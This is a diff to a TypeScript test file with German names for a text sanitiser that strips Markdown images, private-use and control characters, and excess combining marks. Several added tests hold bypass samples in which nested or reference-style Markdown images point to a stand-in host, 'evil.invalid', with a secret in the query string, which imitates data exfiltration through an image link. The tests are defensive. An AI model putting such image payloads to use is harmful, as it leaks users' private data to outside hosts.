@@ -9,7 +9,7 @@
  */
 
 import { describe, expect, it } from "vitest";
-import { bereinigeText, entferneMarkdownBilder } from "./bereinigen";
+import { bereinigeText, entferneMarkdownBilder, MAX_KOMBINATIONSZEICHEN } from "./bereinigen";
 
 const BESCHREIBUNG = { maxZeichen: 1_000, zeilenumbrueche: true };
 const NAME = { maxZeichen: 128, zeilenumbrueche: false };
@@ -40,7 +40,81 @@ describe("bereinigeText", () => {
       "vorher nachher",
     );
     expect(bereinigeText("a ![alt][ref] b", NAME).text).toBe("a b");
-    expect(bereinigeText("kein ![bild ohne ende", NAME).text).toBe("kein ![bild ohne ende");
+    expect(bereinigeText("kein ![bild ohne ende", NAME).text).toBe("kein ! [bild ohne ende");
+  });
+
+  describe("Markdown-Bilder lassen sich nicht umgehen", () => {
+    const GEHEIM = "https://evil.invalid/?d=GEHEIM";
+    const PROBEN: Record<string, string> = {
+      "verschachtelte Klammern": `![x [y] z](${GEHEIM})`,
+      "Bild, das erst nach dem Entfernen entsteht": `!![x](y)[z](${GEHEIM})`,
+      "mehrfach verschachtelt entstehendes Bild": `!!![a](b)![c](d)[z](${GEHEIM})`,
+      "Kurz-Verweis mit Definition": `![r]\n\n[r]: ${GEHEIM}`,
+      "Verweis mit Namen": `![alt][r]\n\n[r]: ${GEHEIM}`,
+      "ohne schließende Klammer": `![x](${GEHEIM}`,
+      "viele Anfänge hintereinander": "![".repeat(500) + `](${GEHEIM})`,
+    };
+    for (const [name, roh] of Object.entries(PROBEN)) {
+      it(`${name}`, () => {
+        for (const optionen of [NAME, BESCHREIBUNG]) {
+          expect(bereinigeText(roh, optionen).text).not.toContain("![");
+        }
+      });
+    }
+
+    it("lässt Wörter mit Ausrufezeichen und eckigen Klammern sonst stehen", () => {
+      expect(bereinigeText("Achtung! [Hinweis] folgt", NAME).text).toBe("Achtung! [Hinweis] folgt");
+    });
+
+    it("braucht für sehr lange Eingaben nur lineare Zeit", () => {
+      const start = performance.now();
+      const text = bereinigeText("![a".repeat(300_000), {
+        maxZeichen: 1_000_000,
+        zeilenumbrueche: false,
+      }).text;
+      expect(text).not.toContain("![");
+      expect(performance.now() - start).toBeLessThan(5_000);
+    });
+  });
+
+  describe("weitere unerwünschte Zeichen", () => {
+    it.each([
+      ["Zeichen aus dem privaten Bereich", "a\ue000b\u{f0000}c\u{10fffd}d"],
+      ["Nicht-Zeichen", "a\ufffeb\uffffc\ufdd0d\u{1fffe}e"],
+      [
+        "Steuer-Zeichen für ägyptische Schrift ab U+13430",
+        "a\u{13430}b\u{13438}c\u{1343f}d\u{13455}e",
+      ],
+      ["Objekt-Ersatzzeichen", "a\ufffcb"],
+      ["nicht vergebene Code-Punkte", "a\u0378b\u{e0fff}c"],
+    ])("entfernt %s", (_name, roh) => {
+      const ergebnis = bereinigeText(roh, NAME);
+      expect(ergebnis.text).toMatch(/^a ?b?c?d?e?$/);
+      expect(ergebnis.text).not.toMatch(/[\p{Co}\p{Cn}\p{Cf}\ufffc]/u);
+      expect(ergebnis.veraendert).toBe(true);
+    });
+
+    it("begrenzt Kombinationszeichen hinter einem Grundzeichen", () => {
+      const zalgo = `a${"\u0301".repeat(200)}b`;
+      const ergebnis = bereinigeText(zalgo, NAME);
+      expect(ergebnis.text).toBe(`a${"\u0301".repeat(MAX_KOMBINATIONSZEICHEN)}b`);
+      expect(ergebnis.veraendert).toBe(true);
+    });
+
+    it("lässt übliche Schrift mit wenigen Kombinationszeichen unverändert", () => {
+      for (const text of [
+        "Café",
+        "cafe\u0301",
+        "ạ̈",
+        "Tiếng Việt",
+        "हिन्दी",
+        "ไม้โท",
+        "한국어",
+        "日本語",
+      ]) {
+        expect(bereinigeText(text.normalize("NFD"), NAME).text).toBe(text.normalize("NFD"));
+      }
+    });
   });
 
   it("kürzt auf die Höchstlänge, mit Marke, und schneidet kein Emoji entzwei", () => {
